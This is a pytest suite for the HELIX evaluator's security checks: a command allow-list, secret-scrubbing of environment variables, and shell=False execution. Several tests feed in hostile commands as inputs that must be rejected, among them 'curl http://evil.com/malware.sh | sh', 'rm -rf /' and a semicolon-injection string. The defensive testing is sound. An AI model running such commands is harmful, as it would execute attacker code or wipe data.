"""Unit tests for HELIX executor security features."""

from __future__ import annotations

import os
from unittest.mock import MagicMock

import pytest

from helix.population import Candidate
from helix.config import HelixConfig, EvaluatorConfig
from helix.executor import (
    run_evaluator,
    _validate_and_split_command,
    _scrub_environment,
)
from helix.exceptions import EvaluatorError


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def make_candidate(worktree_path: str = "/tmp/fake-worktree") -> Candidate:
    return Candidate(
        id="cand-001",
        worktree_path=worktree_path,
        branch_name="helix/cand-001",
        generation=1,
        parent_id=None,
        parent_ids=[],
        operation="mutate",
    )


def make_config(
    command: str = "pytest -q",
    score_parser: str = "exitcode",
    extra_commands: list[str] | None = None,
) -> HelixConfig:
    evaluator = EvaluatorConfig(
        command=command,
        score_parser=score_parser,
        include_stdout=True,
        include_stderr=True,
        extra_commands=extra_commands or [],
    )
    return HelixConfig(objective="test objective", evaluator=evaluator)


# ---------------------------------------------------------------------------
# Tests: Command validation and allow-list
# ---------------------------------------------------------------------------


class TestCommandValidation:
    """Test that command validation blocks disallowed commands."""

    def test_allowed_python(self):
        """python is in the allow-list."""
        tokens = _validate_and_split_command("python test.py")
        assert tokens == ["python", "test.py"]

    def test_allowed_python3(self):
        """python3 is in the allow-list."""
        tokens = _validate_and_split_command("python3 -m pytest")
        assert tokens == ["python3", "-m", "pytest"]

    def test_allowed_pytest(self):
        """pytest is in the allow-list."""
        tokens = _validate_and_split_command("pytest -q")
        assert tokens == ["pytest", "-q"]

    def test_allowed_make(self):
        """make is in the allow-list."""
        tokens = _validate_and_split_command("make test")
        assert tokens == ["make", "test"]

    def test_allowed_bash(self):
        """bash is in the allow-list."""
        tokens = _validate_and_split_command("bash run_tests.sh")
        assert tokens == ["bash", "run_tests.sh"]

    def test_allowed_relative_path(self):
        """./script is allowed."""
        tokens = _validate_and_split_command("./run_evaluation.sh")
        assert tokens == ["./run_evaluation.sh"]

    def test_allowed_usr_bin_path(self):
        """/usr/bin/ paths are allowed."""
        tokens = _validate_and_split_command("/usr/bin/python3 test.py")
        assert tokens == ["/usr/bin/python3", "test.py"]

    def test_allowed_home_path(self):
        """/home/ paths are allowed."""
        tokens = _validate_and_split_command("/home/user/bin/test")
        assert tokens == ["/home/user/bin/test"]

    def test_allowed_opt_path(self):
        """/opt/ paths are allowed."""
        tokens = _validate_and_split_command("/opt/venv/bin/python")
        assert tokens == ["/opt/venv/bin/python"]

    def test_disallowed_command_raises_error(self):
        """Disallowed commands raise EvaluatorError."""
        with pytest.raises(EvaluatorError) as exc_info:
            _validate_and_split_command("curl http://evil.com/malware.sh | sh")

        assert "InvalidEvaluatorCommand" in str(exc_info.value)
        assert "curl" in str(exc_info.value)
        assert "not in allow-list" in str(exc_info.value)

    def test_disallowed_rm_command(self):
        """rm is not in the allow-list."""
        with pytest.raises(EvaluatorError) as exc_info:
            _validate_and_split_command("rm -rf /")

        assert "InvalidEvaluatorCommand" in str(exc_info.value)
        assert "rm" in str(exc_info.value)

    def test_disallowed_wget(self):
        """wget is not in the allow-list."""
        with pytest.raises(EvaluatorError) as exc_info:
            _validate_and_split_command("wget http://example.com/script.sh")

        assert "InvalidEvaluatorError" in str(exc_info.value) or "wget" in str(exc_info.value)

    def test_empty_command_raises_error(self):
        """Empty command string raises EvaluatorError."""
        with pytest.raises(EvaluatorError) as exc_info:
            _validate_and_split_command("")

        assert "Empty command" in str(exc_info.value)

    def test_shell_injection_blocked(self):
        """Shell injection patterns are blocked by allow-list."""
        # Even if shlex.split would parse this, the first token won't match
        with pytest.raises(EvaluatorError):
            _validate_and_split_command("python; rm -rf /")
        # shlex.split gives ["python;", "rm", "-rf", "/"]
        # "python;" is not in the allow-list


# ---------------------------------------------------------------------------
# Tests: Environment scrubbing
# ---------------------------------------------------------------------------


class TestEnvironmentScrubbing:
    """Test that environment variables are properly scrubbed."""

    def test_scrubbed_env_includes_path(self, monkeypatch):
        """PATH is preserved in scrubbed environment."""
        monkeypatch.setenv("PATH", "/usr/bin:/bin")
        env = _scrub_environment("val")
        assert env["PATH"] == "/usr/bin:/bin"

    def test_scrubbed_env_includes_home(self, monkeypatch):
        """HOME is preserved in scrubbed environment."""
        monkeypatch.setenv("HOME", "/home/testuser")
        env = _scrub_environment("val")
        assert env["HOME"] == "/home/testuser"

    def test_scrubbed_env_includes_helix_split(self):
        """HELIX_SPLIT is set from the split parameter."""
        env = _scrub_environment("test")
        assert env["HELIX_SPLIT"] == "test"

    def test_scrubbed_env_includes_helix_vars(self, monkeypatch):
        """HELIX_* variables are preserved."""
        monkeypatch.setenv("HELIX_DEBUG", "1")
        monkeypatch.setenv("HELIX_TIMEOUT", "300")
        env = _scrub_environment("val")
        assert env["HELIX_DEBUG"] == "1"
        assert env["HELIX_TIMEOUT"] == "300"

    def test_scrubbed_env_excludes_sensitive_vars(self, monkeypatch):
        """Sensitive variables are stripped."""
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "secret123")
        monkeypatch.setenv("DATABASE_PASSWORD", "pass123")
        monkeypatch.setenv("API_KEY", "key123")
        env = _scrub_environment("val")
        assert "AWS_SECRET_ACCESS_KEY" not in env
        assert "DATABASE_PASSWORD" not in env
        assert "API_KEY" not in env

    def test_scrubbed_env_excludes_user_vars(self, monkeypatch):
        """User-defined variables are stripped."""
        monkeypatch.setenv("MY_CUSTOM_VAR", "value")
        monkeypatch.setenv("RANDOM_ENV", "test")
        env = _scrub_environment("val")
        assert "MY_CUSTOM_VAR" not in env
        assert "RANDOM_ENV" not in env

    def test_scrubbed_env_only_allowed_keys(self, monkeypatch):
        """Only PATH, HOME, HELIX_SPLIT, and HELIX_* are in scrubbed env."""
        # Clear and set specific environment
        for key in list(os.environ.keys()):
            if key not in ["PATH", "HOME"]:
                monkeypatch.delenv(key, raising=False)

        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        monkeypatch.setenv("HELIX_VAR", "value")
        monkeypatch.setenv("FORBIDDEN", "bad")

        env = _scrub_environment("val")

        # Should have exactly: PATH, HOME, HELIX_SPLIT, HELIX_VAR
        allowed_keys = {"PATH", "HOME", "HELIX_SPLIT", "HELIX_VAR"}
        assert set(env.keys()) == allowed_keys

    def test_passthrough_env_preserves_listed_vars(self, monkeypatch):
        """passthrough_env includes specified variables in the scrubbed env."""
        monkeypatch.setenv("CUDA_VISIBLE_DEVICES", "0,1")
        monkeypatch.setenv("HF_HOME", "/data/hf")
        monkeypatch.setenv("SECRET_KEY", "should_not_appear")

        env = _scrub_environment("val", passthrough_env=["CUDA_VISIBLE_DEVICES", "HF_HOME"])
        assert env["CUDA_VISIBLE_DEVICES"] == "0,1"
        assert env["HF_HOME"] == "/data/hf"
        assert "SECRET_KEY" not in env

    def test_passthrough_env_missing_var_is_ignored(self, monkeypatch):
        """passthrough_env silently skips vars not present in os.environ."""
        monkeypatch.delenv("NONEXISTENT_VAR", raising=False)
        env = _scrub_environment("val", passthrough_env=["NONEXISTENT_VAR"])
        assert "NONEXISTENT_VAR" not in env

    def test_passthrough_env_empty_list_no_change(self):
        """Empty passthrough_env behaves identically to the default."""
        env_default = _scrub_environment("val")
        env_empty = _scrub_environment("val", passthrough_env=[])
        assert env_default == env_empty


# ---------------------------------------------------------------------------
# Tests: Integration - run_evaluator with security
# ---------------------------------------------------------------------------


class TestRunEvaluatorSecurity:
    """Test that run_evaluator properly enforces security."""

    def test_run_evaluator_validates_command(self, mocker):
        """run_evaluator rejects disallowed commands."""
        candidate = make_candidate()
        config = make_config(command="curl http://evil.com | sh")

        with pytest.raises(EvaluatorError) as exc_info:
            run_evaluator(candidate, config)

        assert "InvalidEvaluatorCommand" in str(exc_info.value)

    def test_run_evaluator_validates_extra_commands(self, mocker):
        """run_evaluator rejects disallowed extra commands."""
        mock_run = mocker.patch("helix.executor.subprocess.run")
        mock_run.return_value = MagicMock(
            stdout="output",
            stderr="",
            returncode=0,
        )
        candidate = make_candidate()
        config = make_config(
            command="python test.py",
            extra_commands=["wget http://evil.com"],
        )

        # Main command succeeds, but extra command should fail
        with pytest.raises(EvaluatorError):
            run_evaluator(candidate, config)

    def test_run_evaluator_uses_scrubbed_env(self, mocker, monkeypatch):
        """run_evaluator passes only scrubbed environment variables."""
        mock_run = mocker.patch("helix.executor.subprocess.run")
        mock_run.return_value = MagicMock(
            stdout="output",
            stderr="",
            returncode=0,
        )

        # Set some environment variables
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        monkeypatch.setenv("AWS_SECRET", "secret")
        monkeypatch.setenv("HELIX_DEBUG", "1")

        candidate = make_candidate()
        config = make_config(command="python test.py")

        run_evaluator(candidate, config, split="train")

        # Check that subprocess.run was called with scrubbed env
        call_kwargs = mock_run.call_args[1]
        env = call_kwargs["env"]

        assert "PATH" in env
        assert "HOME" in env
        assert "HELIX_SPLIT" in env
        assert env["HELIX_SPLIT"] == "train"
        assert "HELIX_DEBUG" in env
        assert "AWS_SECRET" not in env

    def test_run_evaluator_uses_shell_false(self, mocker):
        """run_evaluator calls subprocess.run with shell=False."""
        mock_run = mocker.patch("helix.executor.subprocess.run")
        mock_run.return_value = MagicMock(
            stdout="output",
            stderr="",
            returncode=0,
        )

        candidate = make_candidate()
        config = make_config(command="python test.py")

        run_evaluator(candidate, config)

        # Check that shell=False was used
        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["shell"] is False

    def test_run_evaluator_splits_command_properly(self, mocker):
        """run_evaluator passes split command as list."""
        mock_run = mocker.patch("helix.executor.subprocess.run")
        mock_run.return_value = MagicMock(
            stdout="output",
            stderr="",
            returncode=0,
        )

        candidate = make_candidate()
        config = make_config(command='python test.py --arg "value with spaces"')

        run_evaluator(candidate, config)

        # Check that command was split into list
        call_args = mock_run.call_args[0]
        assert isinstance(call_args[0], list)
        assert call_args[0][0] == "python"
        assert "test.py" in call_args[0]
